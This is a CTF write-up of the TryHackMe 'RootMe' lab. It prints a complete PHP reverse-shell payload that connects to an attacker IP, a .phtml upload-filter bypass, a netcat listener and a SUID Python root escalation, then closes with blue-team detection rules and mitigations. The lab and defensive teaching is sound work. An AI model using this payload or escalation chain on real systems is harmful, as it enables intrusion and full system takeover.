# RootMe – TryHackMe Walkthrough

**Room**: [RootMe](https://tryhackme.com/room/rootme)  
**Difficulty**: Easy  
**Techniques**: File upload, reverse shell, SUID privilege escalation  
**Date**: June 2026  

---

## 📸 Screenshots
All screenshots are in [`screenshots/`](screenshots/) folder.

---

## 🔴 Attack Chain

### 1. Enumeration
```bash
nmap -sV -sC -Pn 10.113.157.86
```
Open ports:
- 22/tcp (SSH)
- 80/tcp (HTTP)

![Nmap scan](screenshots/2%20Nmap%20Scan.PNG)

### 2. Directory Brute Force
```bash
gobuster dir -u http://10.113.157.86 -w /usr/share/wordlists/dirb/common.txt -t 50
```
Discovered:
- `/panel` – file upload form
- `/uploads` – uploaded files directory

![Gobuster](screenshots/3%20gobuster.PNG)

### 3. File Upload Bypass
The `/panel` upload form blocks `.php` files. Bypass by renaming to `.phtml`.

![Upload form](screenshots/4%20upload-form.PNG)

**Payload used** (`shell.phtml`):
```php
<?php
set_time_limit(0);
$ip = '192.168.143.13';  # Your Kali VPN IP
$port = 4444;
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) die("error\n");
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes, NULL, NULL);
if (!is_resource($process)) die("error\n");
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    $read = array($sock, $pipes[1], $pipes[2]);
    $write = NULL;
    $except = NULL;
    if (false === ($num_changed = stream_select($read, $write, $except, 0, 100000))) break;
    foreach ($read as $fd) {
        if ($fd == $sock) {
            $cmd = fread($sock, $chunk_size);
            if (strlen($cmd) == 0) break 2;
            fwrite($pipes[0], $cmd);
        } elseif ($fd == $pipes[1]) {
            $output = fread($pipes[1], $chunk_size);
            if (strlen($output) == 0) break 2;
            fwrite($sock, $output);
        } elseif ($fd == $pipes[2]) {
            $error = fread($pipes[2], $chunk_size);
            if (strlen($error) == 0) break 2;
            fwrite($sock, $error);
        }
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

![Shell payload](screenshots/5%20shell.phtml.PNG)
![ls -la shell.phtml](screenshots/6%20ls%20-la%20shell.phtml.PNG)
![Upload success](screenshots/7-upload-success.PNG)

### 4. Reverse Shell
Started netcat listener:
```bash
nc -lvnp 4444
```
Triggered the shell by visiting `/uploads/shell.phtml`.

![Netcat listener](screenshots/8%20nc%20shell.PNG)
![Reverse shell](screenshots/8%20nc%20shell.PNG)

Stabilized shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
```

![Stabilized shell](screenshots/9%20stabilize%20shell.PNG)

### 5. First Flag (user.txt)
```bash
find / -type f -name user.txt 2>/dev/null
cat /var/www/user.txt
```

![Finding user.txt](screenshots/10%20find-user-txt.PNG)
![First flag](screenshots/11%20user-txt-flag.PNG)

### 6. Privilege Escalation (SUID Python)
Found weird SUID binary:
```bash
find / -perm -4000 -type f 2>/dev/null | grep python
```
Output: `/usr/bin/python2.7`

![SUID find](screenshots/12%20suid-find.PNG)

Escalated to root:
```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami  # root
```

![Root shell](screenshots/13%20root-shell.PNG)

### 7. Final Flag (root.txt)
```bash
cat /root/root.txt
```

![Root flag](screenshots/14%20root-flag.PNG)

---

## 🔵 Detection & Mitigation (Blue Team)

| Attack Step | Detection Method | Mitigation |
|-------------|------------------|-------------|
| Directory brute force | Web server logs showing 404/403 bursts | Rate limiting, WAF |
| File upload bypass (.phtml) | Monitor upload extensions; scan file contents | Whitelist allowed extensions, scan with antivirus |
| Reverse shell (PHP) | Process monitoring (Sysmon Event ID 1); network egress filtering | Block outbound high ports; restrict web user permissions |
| SUID Python abuse | Monitor execution of SUID binaries (auditd) | Remove SUID from python: `chmod u-s /usr/bin/python2.7` |

### Sigma Rule for SUID Python Abuse
```yaml
title: Suspicious Python SUID Execution
status: experimental
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith: '/python2.7'
        CommandLine|contains: 'os.execl'
    condition: selection
```

### Auditd Rule for SUID Monitoring
```bash
-w /usr/bin/python2.7 -p x -k python_suid_exec
```

---

## 📚 Key Takeaways

- Always run `gobuster` – hidden directories like `/panel` are common.
- Upload filters can be bypassed with `.phtml` or `.php5` extensions.
- Stabilize reverse shells with `python -c 'import pty; pty.spawn("/bin/bash")'`.
- Check SUID binaries – Python with SUID is an instant win.
- **Never** set SUID on interpreters like Python, Perl, or Ruby.

---

## 🔗 Full Walkthrough on GitHub

- [HK101-cyber/TryHackMe-Walkthroughs/rootme](https://github.com/HK101-cyber/TryHackMe-Walkthroughs/tree/main/rootme)

---

## 📢 Connect with Me

- **LinkedIn**: [Hammad Khan](https://linkedin.com/in/hammad-khan011)
- **GitHub**: [HK101-cyber](https://github.com/HK101-cyber)
- **Reddit**: [HK101_Cyber](https://www.reddit.com/user/HK101_Cyber)
- **Email**: hammad.k.sec@email.com

Open to remote **SOC Engineer** or **Junior Pentesting** roles.

---

**#tryhackme #rootme #ctf #pentesting #soc #privilegeescalation #blueteam #linux**
